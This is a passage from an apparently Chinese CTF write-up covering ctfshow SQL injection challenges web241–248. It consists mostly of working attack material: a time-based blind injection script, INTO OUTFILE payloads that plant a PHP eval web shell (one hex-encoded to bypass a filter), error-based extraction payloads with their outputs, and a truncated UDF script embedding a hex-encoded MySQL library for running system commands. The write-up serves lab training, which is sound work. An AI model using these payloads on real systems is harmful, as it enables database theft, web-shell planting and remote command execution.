class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,sleep(0.05),0)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time_s = time.time()</span><br><span class="line">            _ = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, data=data)</span><br><span class="line">            time_e = time.time()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt;= <span class="number">0.7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(condition.<span class="built_in">format</span>(payload, index, mid)):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>outfile 后面的路径注入，已知语法    </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"> </span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS <span class="operator">|</span> COLUMNS&#125;</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">        [[OPTIONALLY] ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">        [ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<p>可以利用 export_options 插 shell。<br>payload: <code>filename=sh.php&#39; lines terminated by &#39;&lt;?php eval($_POST[1]); ?&gt;&#39;%23</code><br>蚁剑连接 <code>/dump/sh.php</code>，flag 在 <code>/flag.here</code>。    </p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤了php</span></span><br></pre></td></tr></table></figure>
<p>outfile 后面的路径注入，php 被过滤，文件名部分改用 .user.ini 绕过，内容改用十六进制绕过。<br>ini 文件中注释 <code>;</code> 开头，这里用 starting by ‘;’ 注释掉原本的内容，后面的字符串前面加个换行就不影响了。<br>payload1: <code>filename=.user.ini&#39; lines starting by &#39;;&#39; terminated by 0x0a0a6175746f5f70726570656e645f66696c653d736166652e6a70670a6175746f5f617070656e645f66696c653d736166652e6a7067; %23</code><br>payload2: <code>filename=safe.jpg&#39; lines terminated by 0x3c3f706870206576616c28245f504f53545b315d293b203f3e; %23</code><br>蚁剑连接 <code>/dump/</code>，flag 在 <code>/flag.here</code>。    </p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><p>没有过滤的报错注入。    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>payload1: <code>1&#39; and updatexml(1,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|banlist,ctfshow_flag,ctfshow_us&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>1&#39; and updatexml(1,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flag&#39;)),1) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|id,flag,info&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload3: <code>1&#39; and updatexml(1,concat(0x7c,(select flag from ctfshow_flag)),1) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|ctfshow&#123;9efdc62f-4ea2-4d85-9d42&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload4: <code>1&#39; and updatexml(1,concat(0x7c,mid((select flag from ctfshow_flag),30,30)),1) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|42-193e145caabd&#125;&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>拼接前后两段得到 flag。    </p>
<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml</span></span><br></pre></td></tr></table></figure>
<p>有过滤的报错注入，提示过滤了 updatexml，但还可以用 extractvalue。<br>payload1: <code>1&#39; and extractvalue(1,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|banlist,ctfshow_flagsa,ctfshow_&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>1&#39; and extractvalue(1,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;))) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|id,flag1,info&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload3: <code>1&#39; and extractvalue(1,concat(0x7c,(select flag1 from ctfshow_flagsa))) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|ctfshow&#123;f7f4c22a-8131-4158-9f14&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload4: <code>1&#39; and extractvalue(1,concat(0x7c,mid((select flag1 from ctfshow_flagsa), 30, 30))) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;XPATH syntax error: &#x27;|14-43d8f263be54&#125;&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>拼接前后两段得到 flag。    </p>
<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml extractvalue</span></span><br></pre></td></tr></table></figure>
<p>有过滤的报错注入，这次把 extractvalue 也禁用了，要用 floor。<br>关于 floor 报错注入的理解见 <a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a>，原理不再赘述。<br>payload1: <code>1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;Duplicate entry &#x27;ctfshow_flags1&#x27; for key &#x27;group_key&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;Duplicate entry &#x27;flag21&#x27; for key &#x27;group_key&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload3: <code>1&#39; and (select 1 from (select count(*),concat((select flag2 from ctfshow_flags),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;Duplicate entry &#x27;ctfshow&#123;0f6309d1-ca9d-4653-b570-ea7802592546&#125;1&#x27; for key &#x27;group_key&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml extractvalue floor</span></span><br></pre></td></tr></table></figure>
<p>有过滤的报错注入，这次新增禁用 <code>floor</code>，还可以用 ceil 代替。<br>payload1: <code>1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;Duplicate entry &#x27;ctfshow_flagsa2&#x27; for key &#x27;group_key&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 3,1),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;Duplicate entry &#x27;flag?2&#x27; for key &#x27;group_key&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload3: <code>1&#39; and (select 1 from (select count(*),concat((select `flag?` from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</code><br>注意这里 <code>flag?</code> 包含 <code>?</code> 要用反引号包裹。    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;Duplicate entry &#x27;ctfshow&#123;b98fc9f9-0a57-4296-ad5b-cb7deb1d2921&#125;2&#x27; for key &#x27;group_key&#x27;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤,</span></span><br></pre></td></tr></table></figure>
<p>udf 注入，找了个脚本改了下。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c4cfac67-eec1-4378-ac1b-75c52840f816.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E